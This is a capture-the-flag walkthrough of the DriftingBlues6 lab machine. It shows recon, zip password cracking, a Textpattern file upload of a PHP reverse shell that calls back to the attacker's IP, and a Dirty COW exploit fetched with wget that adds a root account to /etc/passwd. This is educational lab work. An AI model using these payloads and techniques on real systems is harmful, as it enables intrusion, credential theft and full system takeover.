# DriftingBlues6
![image](https://hackmd.io/_uploads/HycnGK52Jl.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 -p- 192.168.171.219
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 02:01 EDT
Nmap scan report for 192.168.171.219
Host is up (0.10s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 333.47 seconds

```
#### 1.1 Dirb
```
┌──(chw㉿CHW)-[~]
└─$ dirb http://192.168.171.219/       

-----------------
DIRB v2.22    
By The Dark Raver
-----------------                                             

---- Scanning URL: http://192.168.171.219/ ----
+ http://192.168.171.219/cgi-bin/ (CODE:403|SIZE:291)
+ http://192.168.171.219/db (CODE:200|SIZE:53656)
+ http://192.168.171.219/index (CODE:200|SIZE:750)           
+ http://192.168.171.219/index.html (CODE:200|SIZE:750)       
+ http://192.168.171.219/robots (CODE:200|SIZE:110)           
+ http://192.168.171.219/robots.txt (CODE:200|SIZE:110)   
+ http://192.168.171.219/server-status (CODE:403|SIZE:296)   
==> DIRECTORY: http://192.168.171.219/textpattern/ 
+ http://192.168.171.219/textpattern/index.php (CODE:200|SIZE:12414) 
+ http://192.168.171.219/textpattern/LICENSE (CODE:200|SIZE:15170)
+ http://192.168.171.219/textpattern/README (CODE:200|SIZE:6311)
==> DIRECTORY: http://192.168.171.219/textpattern/rpc/
==> DIRECTORY: http://192.168.171.219/textpattern/textpattern/
==> DIRECTORY: http://192.168.171.219/textpattern/themes/
```
- 瀏覽頁面 `/robots.txt`:\
![image](https://hackmd.io/_uploads/rJApccc21x.png)
> `dont forget to add .zip extension to your dir-brute ;)`

用 `.zip` extension 重掃一次
```
┌──(chw㉿CHW)-[~]
└─$ ffuf -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.171.219/FUZZ.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.171.219/FUZZ.zip
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 107ms]
#                       [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 107ms]
# Copyright 2007 James Fisher [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 112ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 113ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 113ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 113ms]
#                       [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 113ms]
# on atleast 2 different hosts [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 1203ms]
#                       [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 2205ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 2206ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 3214ms]
#                       [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 4216ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 750, Words: 44, Lines: 76, Duration: 4226ms]
spammer                 [Status: 200, Size: 179, Words: 3, Lines: 2, Duration: 103ms]
:: Progress: [220560/220560] :: Job [1/1] :: 397 req/sec :: Duration: [0:09:57] :: Errors: 0 ::
```
> spammer.zip

- 瀏覽頁面 `/textpattern/index.php`
![image](https://hackmd.io/_uploads/rJyXh5531x.png)
> PHP 環境未設定 `date.timezone`
- 瀏覽頁面 `/textpattern/textpattern/`
![image](https://hackmd.io/_uploads/r1iHn9c3Jl.png)
> 沒有透露 textpattern 版本，無法選定 exploit\
> 在 `http://192.168.171.219/textpattern/README`找到版本\
> >Textpattern CMS 4.8.3\
> >![image](https://hackmd.io/_uploads/H1fwWs9nkg.png)
> > exploit  48943 需要透過 file upload
- 瀏覽頁面 `/textpattern/textpattern/setup/index.php`
![image](https://hackmd.io/_uploads/HJSc25c3kg.png)
> `/textpattern/textpattern/setup/index.php` 透露透露資訊：\
> ![image](https://hackmd.io/_uploads/HJk0-jqnke.png)

### 2. wget zip
總結上述 recon，先從題目提示 robots 下手
```
┌──(chw㉿CHW)-[~]
└─$ wget http://192.168.171.219/spammer.zip

┌──(chw㉿CHW)-[~]
└─$ unzip spammer.zip               
Archive:  spammer.zip
[spammer.zip] creds.txt password:
```
> 需要密碼

### 3. fcrackzip
```
┌──(chw㉿CHW)-[~]
└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt spammer.zip

found file 'creds.txt', (size cp/uc     27/    15, flags 1, chk b003)


PASSWORD FOUND!!!!: pw == myspace4

```
> `spammer.zip`:`myspace4`

解壓縮 `spammer.zip`
```
┌──(chw㉿CHW)-[~]
└─$ unzip spammer.zip                                                 
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt                                                                                             
┌──(chw㉿CHW)-[~]
└─$ cat creds.txt                                                    
mayer:lionheart  
```
嘗試用帳密登入 `/textpattern/textpattern/index.php`

### 4. Login textpattern
![image](https://hackmd.io/_uploads/BycEroq31l.png)
#### 4.1 Articles Page
在 Articles 一篇文章介紹功能：\
![image](https://hackmd.io/_uploads/rJJM8jq3kg.png)

#### 4.2 利用 file upload
http://192.168.171.219/textpattern/textpattern/index.php?event=file

![image](https://hackmd.io/_uploads/H197Pi9nJx.png)

#### 4.3 撰寫 Reverse shell
使用現成 [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 寫好的 reverse shell
```
┌──(chw㉿CHW)-[~/Desktop/Tool_upload]
└─$ cat chw_revshell.php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.221';  // CHANGE THIS
$port = 8888;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();
...
             
┌──(chw㉿CHW)-[~/Desktop/Tool_upload]
└─$ nc -nvlp 8888                       
listening on [any] 8888 ...

```
#### 4.4 上傳並利用
![image](https://hackmd.io/_uploads/SkwIwjq3yg.png)
filename 會檔掉 `..`，無法塞到 `/var/www/`
![image](https://hackmd.io/_uploads/HJ1rknq3kx.png)
> 失敗

結果在 HTML tag 的地方可以直接看到路徑\
![image](https://hackmd.io/_uploads/rJ45k29hyx.png)
> 塞了一堆 🚮🚮🚮
> > `<a href="/textpattern/index.php?s=file_download&#38;id=7">chw_revshell_finla.php</a>`

直接瀏覽 http://192.168.171.219/textpattern/files/
點選上傳的 reverse shell\
![image](https://hackmd.io/_uploads/rJ8Hm293kx.png)

```
┌──(chw㉿CHW)-[~/Desktop/Tool_upload]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.171.219] 52461
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 04:36:04 up  3:39,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ bash -i
bash: no job control in this shell
www-data@driftingblues:/home$ ls /home
ls /home
www-data@driftingblues:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false 
```
>[!Tip]
沒有 User Flag ?! 應該不是權限太小 (都可以讀 `/etc/passwd`了)

確認權限
```
www-data@driftingblues:/home$ sudo -l
sudo -l
bash: sudo: command not found
www-data@driftingblues:/home$ ls -lah /etc/passwd
ls -lah /etc/passwd
-rw-r--r-- 1 root root 868 Mar 17  2021 /etc/passwd
www-data@driftingblues:/home$ find / -writable -type d 2>/dev/null
find / -writable -type d 2>/dev/null
/run/shm
/run/lock
/run/lock/apache2
/var/www/textpattern/files
/var/lib/php5
/var/cache/apache2/mod_disk_cache
/var/tmp
/proc/3686/task/3686/fd
/proc/3686/fd
/tmp
```
## Privileges Escalation

### 5. searchsploit
```
www-data@driftingblues:/home$ uname -a
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

```
┌──(chw㉿CHW)-[~]
└─$ searchsploit Linux 3.2.0-4 
...
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                          | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                             | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                                | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                          | linux/local/40839.c
...

```
### 6. exploit (Dirty COW（CVE-2016-5195）)
利用 Dirty COW 的 race condition 改寫 /etc/passwd 來建立或覆蓋帳號
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit -x 40839
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text

┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
www-data@driftingblues:/home$ cd /tmp
www-data@driftingblues:/tmp$ wget http://192.168.45.221/dirty
www-data@driftingblues:/tmp$ ./dirty
./dirty
Please enter the new password: chw

/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fi2TcL2BkmbVQ:0:0:pwned:/root:/bin/bash

mmap: 7ffa82462000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'chw'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fi2TcL2BkmbVQ:0:0:pwned:/root:/bin/bash

mmap: 7ffa82462000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'chw'.

```
### 7. 登入 firefart
```
www-data@driftingblues:/tmp$ su firefart
su firefart
su: must be run from a terminal
www-data@driftingblues:/tmp$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@driftingblues:/tmp$ su firefart
su firefart
Password: chw

firefart@driftingblues:/tmp# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```
所以真沒有 User Flag ?!\
![image](https://hackmd.io/_uploads/H1Otc2qnkl.png)

### ✅ Get Root FLAG
